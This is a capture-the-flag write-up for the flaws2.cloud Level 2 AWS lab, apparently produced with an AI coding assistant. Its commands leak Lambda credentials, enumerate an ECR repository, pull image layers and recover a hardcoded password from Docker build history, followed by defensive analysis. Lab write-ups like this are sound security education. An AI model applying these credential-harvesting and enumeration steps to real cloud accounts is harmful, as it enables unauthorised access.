# Level 2 - Attacker Path Writeup

## Challenge Description

From the Level 2 intro page at `http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud`:

> This next level is running as a container at http://container.target.flaws2.cloud/. Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".

## Objective

Access the protected container endpoint at `container.target.flaws2.cloud` using credentials discovered through ECR enumeration.

## Solution

### Step 1: Obtain Fresh AWS Credentials

Using the Level 1 Lambda credential leak vulnerability:

```bash
curl "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=test"
```

This returns temporary AWS credentials from the Lambda execution environment.

### Step 2: Verify Identity

```bash
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

### Step 3: Enumerate ECR Repository

The challenge hints that the ECR repository is named "level2". While we cannot list all repositories:

```bash
aws ecr describe-repositories --region us-east-1
# AccessDeniedException
```

We CAN query a specific repository by name:

```bash
aws ecr describe-images --repository-name level2 --region us-east-1
```

Output:
```json
{
    "imageDetails": [
        {
            "registryId": "653711331788",
            "repositoryName": "level2",
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTags": ["latest"],
            "imageSizeInBytes": 75937660,
            "imagePushedAt": "2018-11-27T03:34:16+00:00"
        }
    ]
}
```

### Step 4: Extract Container Image Manifest

```bash
aws ecr batch-get-image \
    --repository-name level2 \
    --image-ids imageTag=latest \
    --region us-east-1
```

This returns the image manifest containing:
- Config blob digest: `sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621`
- 10 filesystem layers

### Step 5: Download and Analyze Config Blob

```bash
aws ecr get-download-url-for-layer \
    --repository-name level2 \
    --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621" \
    --region us-east-1
```

Download the config using the returned pre-signed URL and examine the build history.

### Step 6: Discover Hardcoded Credentials

The container config's `history` field reveals the Dockerfile commands used to build the image:

```json
{
    "created": "2018-11-27T03:32:58.202361504Z",
    "created_by": "/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"
}
```

**Credentials discovered:**
- **Username:** `flaws2`
- **Password:** `secret_password`

### Step 7: Access Protected Endpoint

Navigate to `http://container.target.flaws2.cloud/` and authenticate with the discovered credentials.

This grants access to the Level 3 page.

## Vulnerability Analysis

### Primary Vulnerability: Hardcoded Credentials in Container Image

The `htpasswd` command was run with the `-b` flag, which takes the password as a command-line argument. This gets recorded in the Docker image's build history metadata.

**Dangerous pattern:**
```dockerfile
RUN htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
```

**Secure alternative:**
```dockerfile
# Use build-time secrets or multi-stage builds
# Or mount credentials at runtime via secrets manager
RUN --mount=type=secret,id=htpasswd cat /run/secrets/htpasswd > /etc/nginx/.htpasswd
```

### Secondary Vulnerability: Overly Permissive ECR Access

The Lambda execution role had permissions to:
- `ecr:DescribeImages` on the level2 repository
- `ecr:BatchGetImage` to retrieve manifests
- `ecr:GetDownloadUrlForLayer` to download image layers

These permissions were not necessary for the Lambda's intended function and allowed lateral movement to discover container secrets.

## Key Takeaways

1. **Container images preserve build history** - Commands run during `docker build` are stored in image metadata, including any secrets passed as arguments.

2. **ECR permissions matter** - Just like S3 buckets, ECR repositories can have overly permissive policies. Query specific resources even if listing is denied.

3. **Credential rotation** - Hardcoded credentials in container images persist indefinitely unless the image is rebuilt and redeployed.

4. **Defense in depth** - Even if credentials are exposed, additional controls (network segmentation, MFA, IP allowlisting) can limit blast radius.

## Tools Used

- AWS CLI (`aws ecr` commands)
- curl (for Lambda exploitation and downloading layers)
- python3 (for JSON parsing)

## Attack Chain Summary

```
Lambda Credential Leak (Level 1)
         |
         v
    AWS Credentials
         |
         v
ECR Repository Enumeration
         |
         v
Container Image Analysis
         |
         v
  Hardcoded Password in
  Docker Build History
         |
         v
HTTP Basic Auth Bypass
         |
         v
    Level 3 Access
```

---

*Completed with Claude Code (claude-opus-4-5-20251101) - AI-assisted cloud security research*

*Date: 2025-12-06*
